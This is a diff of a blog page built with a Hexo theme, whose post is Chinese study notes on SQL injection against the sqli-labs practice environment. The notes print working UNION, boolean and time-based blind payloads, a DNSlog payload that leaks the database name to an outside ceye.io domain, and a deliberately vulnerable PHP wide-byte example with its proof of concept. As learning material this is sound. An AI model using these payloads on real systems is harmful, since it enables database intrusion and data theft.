@@ -1,5 +1,8 @@
-<!--There may be a bug, but don't worry, QiLing(器灵) says that it can work normally!-->
-
+<!--
+	作者：Sariay
+	时间：2018-09-25
+	描述：There may be a bug, but don't worry, QiLing(器灵) says that it can work normally!
+-->
 
 
 	<!DOCTYPE html>
@@ -16,47 +19,96 @@
     <meta name="keywords" content="" />
     <meta name="description" content="" />
    	<!-- css -->
-	<link rel="stylesheet" href="/css/style.css">	
-	<!-- code -->
-	<link rel="stylesheet" href="//cdn.bootcss.com/highlight.js/9.2.0/styles/github.min.css">	
+	<link rel="stylesheet" href="/css/style.css">
+
 	<!-- favicon -->
 	<link href="/img/favicon.ico" rel="Shortcut Icon" type="image/ico">
+	
 	<!-- font-awesome -->
 	<link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
 </head>
-
-
-
 	<body>	
 		<!--Preloader-->
 <div id="preloader">
 	<div id="status">
-		<img alt="preloader" src="/img/logo.png">
+		<img alt="PRELOADER" src="/img/logo.png">
 	</div>
 </div>
 <!--Preloader end-->
 
+<!-- header -->
 
-	<header>
+	<header id="header-bg-2">
 
 	
 		<div id="cd-logo"><a href="/"><img src="/img/logo.png" alt="Logo"></a></div>
 	
-		
+	
+	<!-- motto or description -->
 		
  		<p class="motto"></p>
 	
 	
+	<!-- current page name or title -->
 	
 		
-			<p class="page-name">SQL注入学习笔记</p>
 		
+			
+			<p class=page-name>当前文章&nbsp;:&nbsp;《SQL注入学习笔记》</p>
+			
 		
 	
+	
+	<!-- others: such as change-bg, time... -->
+	<p class="page-name-other">
+		10/30/2018 
+		<style type="text/css">
+	header:after {
+		content: '';
+		position: relative;
+		top: 0;
+		left: 0;
+		height: 100%;
+		width: 100%;
+		background: #222222;
+		opacity: .5;
+		z-index: -1;
+	}
+	
+	.change-header-bg{
+		font-style: normal;
+	}
+	.change-header-bg i{
+		text-align: center;
+		cursor: pointer;
+		pointer-events: bounding-box;
+	}
+	@media(max-width:512px) {
+		.change-header-bg {
+			display: none;
+			visibility: hidden;
+		}
+	}
+	
+</style>
+
+<script type="text/javascript">
+	function changeHeaderBg(){
+		var random_bg = Math.floor(Math.random() * 109 + 1);
+		var bg = 'url(/img/random/' + random_bg + '.jpg)';
+		$("#header-bg-2").css("background-image", bg);
+	}
+</script>
+
+<span class="change-header-bg">
+	——&nbsp;<i  class="fa fa-camera-retro" onclick="changeHeaderBg()"></i>	
+</span>
+	</p>		
 </header>
 
+<!-- nav -->
 <div id="cd-nav">
-	<a href="#0" class="cd-nav-trigger">Menu<span></span></a>
+	<a href="#0" title="menu" class="cd-nav-trigger"><span></span></a>
 
 	<nav id="cd-main-nav">
 		<ul>
@@ -87,21 +139,21 @@
     		
     		
         	
-            	<li><a href="javascript:;" class="popup-trigger" title="Search">搜索</a></li>
+            	<li class="fa fa-/search"><a href="javascript:;" class="popup-trigger" title="Search">搜索</a></li>
         	
 		</ul>
 	</nav>
 </div>
 
-
-		<main>
+		<!--main-->
+		<main> 
 		<div class="page-container">
-		
-    <!-- content srart -->
+		<!-- content srart -->
 <div class="am-g am-g-fixed blog-fixed blog-content">
 	<div class="am-u-md-8 am-u-sm-12">
 
 		<article class="am-article blog-article-p">
+
 			<div class="am-article-hd">
 				
 
@@ -115,8 +167,6 @@
 		</a>
 	
 
-
-
 				</h1>
 
 				<p class="am-article-meta blog-text-center">
@@ -127,22 +177,24 @@
   		2018-10-28
   </time>
 </a>    
-&nbsp
+&nbsp;
 					</span>
+					
 					<span>						
 						
 							<i class="fa fa-tags"></i>
 							
-								<a href="#笔记" title="笔记" rel="2">笔记</a>&nbsp
+								<a href="#笔记" title="笔记" rel="2">笔记</a>&nbsp;
 													 											
 						
-					</span>	
+					</span>
 				</p>
-			</div>	
+			</div>
 
 			<div class="am-article-bd">
-				<div class="content">
-					<p>SQL注入一直都是web应用层上的高危漏洞之一，在此做一次SQL注入系统学习的笔记。</p>
+				<div class="content" id="post-content">
+					
+						<p>SQL注入一直都是web应用层上的高危漏洞之一，在此做一次SQL注入系统学习的笔记。</p>
 <p># </p>
 <h1 id="1-SQL注入原理"><a href="#1-SQL注入原理" class="headerlink" title="1.SQL注入原理"></a>1.SQL注入原理</h1><p>所谓SQL注入，就是攻击者把SQL命令插入到web表单的输入域或者页面请求的查询字符串，进而欺骗服务器执行恶意的SQL命令。</p>
 <h1 id="2-判断是否是能进行sql注入"><a href="#2-判断是否是能进行sql注入" class="headerlink" title="2.判断是否是能进行sql注入"></a>2.判断是否是能进行sql注入</h1><h2 id="0x01-单引号判断常规注入点"><a href="#0x01-单引号判断常规注入点" class="headerlink" title="0x01 单引号判断常规注入点"></a>0x01 单引号判断常规注入点</h2><p>http:xxx.com/1.php?id=1’</p>
@@ -177,8 +229,8 @@
 <p>在注入点后加（必须为注入点）;–（一个分号，两个横线），例如：<a href="https://link.jianshu.com?t=http://xxxx/article/as.asp?id=1;--" target="_blank" rel="noopener">http://xxxx/article/as.asp?id=1;–</a>。如果返回正常的话，说明数据库是MSSQL。在MSSQL数据库中;和–都是存在的，;用来分离两个语句，而–就是注释符，它后面语句都不执行。如果返回错误，基本可以肯定是ACCESS数据库了。</p>
 <h2 id="0x04-基于显示错误信息判断（常用）"><a href="#0x04-基于显示错误信息判断（常用）" class="headerlink" title="0x04 基于显示错误信息判断（常用）"></a>0x04 基于显示错误信息判断（常用）</h2><p>在注入点后直接加上单引号，根据服务器的报错信息来判断数据库。</p>
 <h1 id="4-SQL注入的分类"><a href="#4-SQL注入的分类" class="headerlink" title="4.SQL注入的分类"></a>4.SQL注入的分类</h1><h2 id="0x01-GET-注入"><a href="#0x01-GET-注入" class="headerlink" title="0x01 GET 注入"></a>0x01 GET 注入</h2><p>顾名思义，get参数传递类型的SQL注入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.254.150/sqli-labs/Less-1/?id=1</span><br></pre></td></tr></table></figure>
-<p><img src="/post/10.28/1.png" alt="1"></p>
+<pre><code>http://192.168.254.150/sqli-labs/Less-1/?id=1
+</code></pre><p><img src="/post/10.28/1.png" alt="1"></p>
 <h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>在id=1后加单引号，页面报错，存在注入</p>
 <p><img src="/post/10.28/2.png" alt="img"></p>
 <p>猜字段数</p>
@@ -279,7 +331,7 @@
 <p>后面的也都一样，暴表，暴列，暴字段。</p>
 <h2 id="0x06-UNION注入"><a href="#0x06-UNION注入" class="headerlink" title="0x06 UNION注入"></a>0x06 UNION注入</h2><p>这种注入其实在上面提到的第一种注入get注入种已经用到了。</p>
 <p>这里再简单的做下笔记：union的作用就是将两个select 查询结果合并。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx/?id= -1&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() %23</span><br></pre></td></tr></table></figure>
+<p><a href="http://xxx/?id=" target="_blank" rel="noopener">http://xxx/?id=</a> -1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() %23</p>
 <p>group_concat():一次性显示查询到的所有值</p>
 <p>limit: 逐一显示</p>
 <h2 id="0x07-基于时间盲注"><a href="#0x07-基于时间盲注" class="headerlink" title="0x07 基于时间盲注"></a>0x07 基于时间盲注</h2><p>基于的原理是，当对数据库进行查询操作，如果查询的条件不存在，语句执行的时间便是0.但往往语句执行的速度非常快，线程信息一闪而过，得到的执行时间基本为0.</p>
@@ -292,16 +344,16 @@
 <p><img src="/post/10.28/29.png" alt="img"></p>
 <p>可以看到这里延时了10秒，证明存在注入点</p>
 <p>接着后面的步骤也都大同小异，简单做下payload的笔记：</p>
-<h3 id="1-爆数据库的版本长度"><a href="#1-爆数据库的版本长度" class="headerlink" title="1.爆数据库的版本长度"></a>1.爆数据库的版本长度</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&apos;and If(length((version()))=6,sleep(10),1)--+</span><br></pre></td></tr></table></figure>
+<h3 id="1-爆数据库的版本长度"><a href="#1-爆数据库的版本长度" class="headerlink" title="1.爆数据库的版本长度"></a>1.爆数据库的版本长度</h3><p><a href="http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and" target="_blank" rel="noopener">http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and</a> If(length((version()))=6,sleep(10),1)–+</p>
 <h3 id="2-爆数据库版本的第一个字符"><a href="#2-爆数据库版本的第一个字符" class="headerlink" title="2.爆数据库版本的第一个字符"></a>2.爆数据库版本的第一个字符</h3><p><a href="http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and" target="_blank" rel="noopener">http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and</a> If(ascii(substr(version(),1,1))=53,sleep(10),1)–+</p>
-<h3 id="3-爆第一个数据库的长度"><a href="#3-爆第一个数据库的长度" class="headerlink" title="3.爆第一个数据库的长度"></a>3.爆第一个数据库的长度</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&apos;and If(length((select schema_name from information_schema.schemata limit 0,1))=18,sleep(10),1)--+</span><br></pre></td></tr></table></figure>
+<h3 id="3-爆第一个数据库的长度"><a href="#3-爆第一个数据库的长度" class="headerlink" title="3.爆第一个数据库的长度"></a>3.爆第一个数据库的长度</h3><p><a href="http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and" target="_blank" rel="noopener">http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and</a> If(length((select schema_name from information_schema.schemata limit 0,1))=18,sleep(10),1)–+</p>
 <h3 id="4-爆第一个数据库的第一个字符"><a href="#4-爆第一个数据库的第一个字符" class="headerlink" title="4.爆第一个数据库的第一个字符"></a>4.爆第一个数据库的第一个字符</h3><p><a href="http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and" target="_blank" rel="noopener">http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and</a> If(ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))=105,sleep(10),1)–+</p>
 <p>这里通过改变limit后的值来确定第几个数据库，第一个数据库的下标为0，依次往后推就是其他的数据库</p>
-<h3 id="5-爆security数据库里的第四个表的长度"><a href="#5-爆security数据库里的第四个表的长度" class="headerlink" title="5.爆security数据库里的第四个表的长度"></a>5.爆security数据库里的第四个表的长度</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&apos;and If(length((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 3,1))=5,sleep(10),1)--+</span><br></pre></td></tr></table></figure>
+<h3 id="5-爆security数据库里的第四个表的长度"><a href="#5-爆security数据库里的第四个表的长度" class="headerlink" title="5.爆security数据库里的第四个表的长度"></a>5.爆security数据库里的第四个表的长度</h3><p><a href="http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and" target="_blank" rel="noopener">http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and</a> If(length((select table_name from information_schema.tables where table_schema=’security’ limit 3,1))=5,sleep(10),1)–+</p>
 <h3 id="6-爆security数据库里的第四个表的第一个字符"><a href="#6-爆security数据库里的第四个表的第一个字符" class="headerlink" title="6.爆security数据库里的第四个表的第一个字符"></a>6.爆security数据库里的第四个表的第一个字符</h3><p><a href="http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and" target="_blank" rel="noopener">http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and</a> If(ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 3,1),1,1))=117,sleep(10),1)–+</p>
 <h3 id="7-爆security数据库里的users表的第二个字段长度"><a href="#7-爆security数据库里的users表的第二个字段长度" class="headerlink" title="7.爆security数据库里的users表的第二个字段长度"></a>7.爆security数据库里的users表的第二个字段长度</h3><p><a href="http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and" target="_blank" rel="noopener">http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and</a> If(length((select column_name from information_schema.columns where table_schema=’security’ and table_name=’users’ limit 1,1))=8,sleep(10),1)–+</p>
-<h3 id="8-爆security数据库里的users表的第二个字段的第一个字符"><a href="#8-爆security数据库里的users表的第二个字段的第一个字符" class="headerlink" title="8.爆security数据库里的users表的第二个字段的第一个字符"></a>8.爆security数据库里的users表的第二个字段的第一个字符</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&apos;and If(ascii(substr((select column_name from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos; limit 1,1),1,1))=117,sleep(10),1)--+</span><br></pre></td></tr></table></figure>
-<h3 id="9-爆security数据库里的users表的第二个字段的第一个数据的长度"><a href="#9-爆security数据库里的users表的第二个字段的第一个数据的长度" class="headerlink" title="9.爆security数据库里的users表的第二个字段的第一个数据的长度"></a>9.爆security数据库里的users表的第二个字段的第一个数据的长度</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&apos;and If(length((select username from security.users limit 0,1))=4,sleep(10),1)--+</span><br></pre></td></tr></table></figure>
+<h3 id="8-爆security数据库里的users表的第二个字段的第一个字符"><a href="#8-爆security数据库里的users表的第二个字段的第一个字符" class="headerlink" title="8.爆security数据库里的users表的第二个字段的第一个字符"></a>8.爆security数据库里的users表的第二个字段的第一个字符</h3><p><a href="http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and" target="_blank" rel="noopener">http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and</a> If(ascii(substr((select column_name from information_schema.columns where table_schema=’security’ and table_name=’users’ limit 1,1),1,1))=117,sleep(10),1)–+</p>
+<h3 id="9-爆security数据库里的users表的第二个字段的第一个数据的长度"><a href="#9-爆security数据库里的users表的第二个字段的第一个数据的长度" class="headerlink" title="9.爆security数据库里的users表的第二个字段的第一个数据的长度"></a>9.爆security数据库里的users表的第二个字段的第一个数据的长度</h3><p><a href="http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and" target="_blank" rel="noopener">http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and</a> If(length((select username from security.users limit 0,1))=4,sleep(10),1)–+</p>
 <p>-——————– </p>
 <p>（这里只做下布尔盲注和时间盲注的手工注入笔记，一般遇到这两种注入的话，手工太过于繁琐，最好用python脚本跑，这里就不贴出代码了）</p>
 <h2 id="0x08-Dnslog盲注"><a href="#0x08-Dnslog盲注" class="headerlink" title="0x08 Dnslog盲注"></a>0x08 Dnslog盲注</h2><p>首先需要有一个可以配置的域名，比如：ceye.io，然后通过代理商设置域名 ceye.io 的 nameserver 为自己的服务器 A，然后再服务器 A 上配置好 DNS Server，这样以来所有 ceye.io 及其子域名的查询都会到 服务器 A 上，这时就能够实时地监控域名查询请求了，图示如下。</p>
@@ -320,7 +372,7 @@
 <p>load_file()函数可以通过dns解析请求。</p>
 <p>以sql-labs第五关：</p>
 <p>payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; and if((select load_file(concat(&apos;\\\\&apos;,(select database()),&apos;.xxxxx.ceye.io\\abc&apos;))),1,0)-- -+</span><br></pre></td></tr></table></figure>
+<p>‘ and if((select load_file(concat(‘\\‘,(select database()),’.xxxxx.ceye.io\abc’))),1,0)– -+</p>
 <p>执行的sql语句：SELECT * FROM users WHERE id=’1’ and if((select load_file(concat(‘\\‘,(select database()),’.xxxxx.ceye.io\abc’))),1,0)</p>
 <p>查看dnslog日志，发现security数据库被查询出来：</p>
 <p><img src="/post/10.28/34.png" alt="img"></p>
@@ -342,9 +394,22 @@
 <p>大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 %df\’，其中\的十六进制是 %5C ，那么现在 %df\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗，也就是说：%df\’ = %df%5c%27=縗’，有了单引号就好注入了。</p>
 <p>举例子：</p>
 <p>以下是一个存在宽字符注入漏洞的PHP程序。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$name=$_GET[&apos;name&apos;];</span><br><span class="line"></span><br><span class="line">$name=addslashes($name);</span><br><span class="line"></span><br><span class="line">$conn=mysql_connect(&apos;localhost&apos;,&apos;root&apos;,&apos;root&apos;);</span><br><span class="line"></span><br><span class="line">if($conn==null)&#123;exit(&quot;connect error !&lt;br&gt;&quot;);&#125;</span><br><span class="line"></span><br><span class="line">mysql_query(&quot;SET NAMES &apos;gbk&apos;&quot;,$conn);</span><br><span class="line"></span><br><span class="line">mysql_select_db(&quot;aaa&quot;,$conn);</span><br><span class="line"></span><br><span class="line">$sql=&quot;select * from a1 where name=&apos;&quot;.$name.&quot;&apos;&quot;;</span><br><span class="line"></span><br><span class="line">$result=mysql_query($sql,$conn);</span><br><span class="line"></span><br><span class="line">while($val=mysql_fetch_row($result))&#123;</span><br><span class="line"></span><br><span class="line">    print_r($val);</span><br><span class="line"></span><br><span class="line">    print(&quot;&lt;br&gt;&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>&lt;?php</p>
+<p>$name=$_GET[‘name’];</p>
+<p>$name=addslashes($name);</p>
+<p>$conn=mysql_connect(‘localhost’,’root’,’root’);</p>
+<p>if($conn==null){exit(“connect error !<br>“);}</p>
+<p>mysql_query(“SET NAMES ‘gbk’”,$conn);</p>
+<p>mysql_select_db(“aaa”,$conn);</p>
+<p>$sql=”select * from a1 where name=’”.$name.”‘“;</p>
+<p>$result=mysql_query($sql,$conn);</p>
+<p>while($val=mysql_fetch_row($result)){</p>
+<p>​    print_r($val);</p>
+<p>​    print(“<br>“);</p>
+<p>}</p>
+<p>?&gt;</p>
 <p>这个PHP程序的SQL注入POC为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test/t3.php?name=a%df&apos; or 1=1; %20%23</span><br></pre></td></tr></table></figure>
+<p><a href="http://127.0.0.1/test/t3.php?name=a%df&#39;" target="_blank" rel="noopener">http://127.0.0.1/test/t3.php?name=a%df&#39;</a> or 1=1; %20%23</p>
 <p>其原理是mysql_query(“SETNAMES ‘gbk’”,$conn)语句将编码字符集修改为gbk，此时，%df\’对应的编码就是%df%5c’，即汉字“運’”，这样单引号之前的转义符号“\”就被吃调了，从而转义消毒失败。</p>
 <p>从宽字节注入漏洞原理可以看出，宽字节注入的关键点有两个：</p>
 <p>（1）          设置宽字节字符集；</p>
@@ -354,13 +419,13 @@
 <p>如果看到一个以.html或者.htm结尾的网页，此时可以通过呢在在地址输入框中输入：</p>
 <p>javascript:alert(document.lastModified)，来得到网页最后的修改时间，如果得到的时间和现在时间一致，此页面就是伪静态，反之是真静态；因为动态页面的最后修改时间总是当前时间，而静态页面的最后修改时间则是它生成的时间。</p>
 <p>在平时的测试过程中我们经常会看到这样一类奇特的地址：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xxx.xx.xx:xxx/test.php/id/1.html   （原型一般为：http://xxx.xxx.xx.xx:xxx/test.php?id=1   ）</span><br></pre></td></tr></table></figure>
+<p><a href="http://xxx.xxx.xx.xx:xxx/test.php/id/1.html" target="_blank" rel="noopener">http://xxx.xxx.xx.xx:xxx/test.php/id/1.html</a>   （原型一般为：<a href="http://xxx.xxx.xx.xx:xxx/test.php?id=1" target="_blank" rel="noopener">http://xxx.xxx.xx.xx:xxx/test.php?id=1</a>   ）</p>
 <p>像上面这种类型的网址URL，往往是一种伪静态网页，遇到这种情况可以直接对”.html”之前的参数加“’”进行判断是否存在注入！</p>
 <p>接着就是在注入点进行各种注入测试了。</p>
 
+					
 				</div>
 			</div>
-
 		</article>
 
 		<ul class="am-pagination">
@@ -368,74 +433,112 @@
 	
 		<li class="am-pagination-next">
 		<a class="pull-right" href="/2018/09/17/2018.10.17/" title="VulnHub-LazySysAdmin 过关笔记">
-			下一篇&raquo;
+			下一篇 &raquo;
 		</a>
 		</li>
 	 
  </ul>
         
 
-			
-
-
-	</div> 
+		<div class="theme-annie-comment-button-container">
+	<button id="annie-comment-button" class="theme-annie-comment-button" onclick="Annie_Comment()">
+		加载评论
+		<!--加载评论-->
+	</button>
 </div>
 
-<!-- code highlight 测试版fix me-->
-<style>
-pre {
-  background: inherit;
-  border: 1px solid #ccc;
-  overflow-x: auto;
-  padding: .5em;
-  position: relative;
-  margin: 0 0 0.8em 0;
-  overflow-y: hidden
-}
+<div id="annie-comment-container" class="theme-annie-comment-main-container">
 
-pre code {
-  margin: -0.5em !important;
-  padding: 0.5em !important;
-  overflow-y: auto;
-  overflow-x: auto;
-  display: block
-}
+	
+		
+			<!-- comment valine -->
+			<!-- show valine comment -->
+<div id="valineComment" class="comment"></div>
 
-code.has-numbering {
-  margin-left: 1.7em !important;
-  word-wrap: normal;
-  word-break: keep-all;
-  white-space: pre
-}
+<!-- valine`s js & css -->
+<script>
+	window.jQuery || document.write('<script src="/js/jquery-2.1.1.min.js"><\/script>')
+</script>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="/js/valine.min.js"></script>
+<link rel="stylesheet" href="/css/comment.css">
 
-.pre-numbering {
-  position: absolute;
-  top: 0;
-  left: 0;
-  width: 2.2em;
-  height: 100%;
-  padding: 0.5em 0.2em 0.5em 0;
-  border-right: 1px solid #C3CCD0;
-  background-color: #EEE;
-  text-align: right;
-  color: #AAA;
-  list-style: none;
-  -webkit-user-select: none;
-  -moz-user-select: none;
-  -ms-user-select: none;
-  user-select: none
-}
-</style>
-<script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script>
+<script>
+	var checkExistComment = setInterval(function() {
+		if( $('#valineComment').length ) {
+			new Valine({
+				// AV 对象来自上面引入av-min.js(老司机们不要开车➳♡゛扎心了老铁)
+				av: AV,
+				//使用id寻找div元素（使用class可能找不到）
+				el: '#valineComment',
+				emoticon_url: 'https://cloud.panjunwen.com/alu',
+				emoticon_list: ["吐.png", "期待.png", "高兴.png", "吐血倒地.png", "哭泣.png", "欢呼.png"],
+				app_id: "3333....", //获取APP ID
+				app_key: "3333......", //获取APP KEY
+				placeholder: "no any!", //评论框占位提示文字        			
+			});
+			clearInterval(checkExistComment);
+		}
+	}, 100);
+</script>
+		
+	
 
-<!-- css爬取自网页 -->
-<!-- code highlight 测试版fix me-->
+</div>
 
+<script type="text/javascript">
+	/* Show Comment */
+	var Annie_Comment = function() {
+		function Show_Hidden(obj) {
+			obj.style.display = 'block';
+		}
+		
+		//var obutton = $('#annie-comment-button');
+		//var obutton = $('#annie-comment-container');
+		var obutton = document.getElementById("annie-comment-button" || "0");
+		var odiv = document.getElementById("annie-comment-container");
+		if( 'obutton' ) {
+			obutton.onclick = function() {
+				Show_Hidden(odiv);
+				$("#annie-comment-button").css("display", 'none');
+				return false;
+			}
+		}
+	};
 
+	(function Annie_Init() {
+		Annie_Comment();
+	})();
+</script>
+		
+		<!--
+	时间：2018-09-24
+	描述：The TOC module refers to 'https://github.com/codefine/hexo-theme-mellow', include toc.ejs、toc.js、toc.css. All rights reserved by codefine. 
+-->
+
+	
+		<aside class="post-widget">
+			<nav class="post-toc-wrap" id="post-toc">
+				
+					<strong>文章目录</strong>
+				
+				
+				<!--toc(post.content)-->
+				<ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#1-SQL注入原理"><span class="post-toc-text">1.SQL注入原理</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#2-判断是否是能进行sql注入"><span class="post-toc-text">2.判断是否是能进行sql注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x01-单引号判断常规注入点"><span class="post-toc-text">0x01 单引号判断常规注入点</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x02-数字型注入点"><span class="post-toc-text">0x02 数字型注入点</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x03-字符型注入点"><span class="post-toc-text">0x03  字符型注入点</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x04-搜索型注入点"><span class="post-toc-text">0x04  搜索型注入点</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#3-判断数据库类型"><span class="post-toc-text">3.判断数据库类型</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x01-一般数据库搭配"><span class="post-toc-text">0x01 一般数据库搭配</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x02-基于特定函数的判断"><span class="post-toc-text">0x02 基于特定函数的判断</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x03-基于辅助的符号的判断"><span class="post-toc-text">0x03 基于辅助的符号的判断</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x04-基于显示错误信息判断（常用）"><span class="post-toc-text">0x04 基于显示错误信息判断（常用）</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#4-SQL注入的分类"><span class="post-toc-text">4.SQL注入的分类</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x01-GET-注入"><span class="post-toc-text">0x01 GET 注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#判断注入点"><span class="post-toc-text">判断注入点</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#爆表"><span class="post-toc-text">爆表</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#分析："><span class="post-toc-text">分析：</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#爆列"><span class="post-toc-text">爆列</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#爆字段"><span class="post-toc-text">爆字段</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x02-POST-注入"><span class="post-toc-text">0x02 POST 注入</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x03-cookie-注入"><span class="post-toc-text">0x03 cookie 注入</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x04-报错注入"><span class="post-toc-text">0x04 报错注入</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x05-布尔注入"><span class="post-toc-text">0x05 布尔注入</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x06-UNION注入"><span class="post-toc-text">0x06 UNION注入</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x07-基于时间盲注"><span class="post-toc-text">0x07 基于时间盲注</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#1-爆数据库的版本长度"><span class="post-toc-text">1.爆数据库的版本长度</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#2-爆数据库版本的第一个字符"><span class="post-toc-text">2.爆数据库版本的第一个字符</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#3-爆第一个数据库的长度"><span class="post-toc-text">3.爆第一个数据库的长度</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#4-爆第一个数据库的第一个字符"><span class="post-toc-text">4.爆第一个数据库的第一个字符</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#5-爆security数据库里的第四个表的长度"><span class="post-toc-text">5.爆security数据库里的第四个表的长度</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#6-爆security数据库里的第四个表的第一个字符"><span class="post-toc-text">6.爆security数据库里的第四个表的第一个字符</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#7-爆security数据库里的users表的第二个字段长度"><span class="post-toc-text">7.爆security数据库里的users表的第二个字段长度</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#8-爆security数据库里的users表的第二个字段的第一个字符"><span class="post-toc-text">8.爆security数据库里的users表的第二个字段的第一个字符</span></a></li><li class="post-toc-item 